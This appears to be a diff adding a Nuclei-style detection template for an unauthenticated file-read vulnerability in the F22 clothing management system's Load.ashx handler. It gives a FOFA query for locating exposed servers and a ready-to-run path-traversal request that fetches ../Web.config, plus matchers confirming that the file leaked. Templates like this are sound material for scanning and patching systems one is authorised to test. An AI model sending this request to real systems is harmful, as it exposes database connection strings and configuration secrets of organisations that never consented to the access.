@@ -1,0 +1,36 @@
+id: F22-Load_ashx-File-reading
+
+info:
+  name: F22服装管理软件系统 Load.ashx 未授权文件访问漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="b28web/Utility/"
+      F22服装管理软件系统 Load.ashx 处理器存在文件访问控制缺陷，攻击者可通过构造特定请求绕过访问控制机制，读取任意文件内容。该漏洞允许非授权用户获取数据库连接字符串、系统配置参数等敏感信息，可能引发横向渗透攻击和数据泄露风险。漏洞利用无需身份验证，攻击者可直接通过路径参数指定目标文件路径。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488930&idx=1&sn=38ba1af39ba20125ed649d159c5f43ff&chksm=c267a091f510298705b8039d4c4578499ed9eff868e0a7de19c468b7ad33aa6526c973e91549&token=385896921&lang=zh_CN#rd
+  tags: F22服装管理软件系统
+
+
+http:
+- raw:
+  - |
+    GET /CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../Web.config HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '<configuration>'
+    - '</configuration>'
+    - 'machine.config.comments'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
